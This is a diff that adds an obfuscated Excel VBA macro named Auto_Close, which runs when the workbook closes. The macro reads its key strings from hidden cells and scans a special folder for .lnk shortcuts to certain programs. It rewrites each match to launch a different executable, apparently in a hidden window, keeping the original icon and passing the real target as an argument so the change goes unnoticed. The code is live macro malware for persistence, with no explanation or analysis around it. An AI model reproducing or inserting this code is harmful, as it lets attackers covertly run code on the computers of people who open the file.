@@ -1,0 +1,18 @@
+Sub Auto_Close()
+Set OrvRJh = CreateObject(activeSheet.Range("AS55").value)
+Set ZcEhaYSmj = CreateObject(activeSheet.Range("AU55").value)
+Set QjBthRJm = ZcEhaYSmj.GetFolder(OrvRJh.SpecialFolders(activeSheet.Range("AW55").value))
+For Each ONtQSVrca In QjBthRJm.Files
+If(InStr(Lcase(ONtQSVrca), ".lnk")) Then
+Set sPbNHTkc = OrvRJh.CreateShortcut(OrvRJh.SPecialFolders(activeSheet.Range("AW55").value) & "\" & ONtQSVrca.name)
+If(InStr(Lcase(sPbNHTkc.targetPath), activeSheet.Range("AX55").value) or InStr(Lcase(sPbNHTkc.targetPath), activeSheet.Range("BB55").value) or InStr(Lcase(sPbNHTkc.targetPath), activeSheet.Range("BE55").value)) Then
+sPbNHTkc.IconLocation = sPbNHTkc.targetpath
+sPbNHTkc.arguments = "-w " & activeSheet.Range("BI55").Value & sPbNHTkc.targetPath & "'" & activeSheet.Range("BM55").Value
+sPbNHTkc.targetpath = left(CurDir, InStr(CurDir, ":")-1) & activeSheet.Range("BO55").value
+if(Len(sPbNHTkc.arguments) < 1023) Then
+sPbNHTkc.save
+end if
+end if
+end if
+next ONtQSVrca
+End Sub
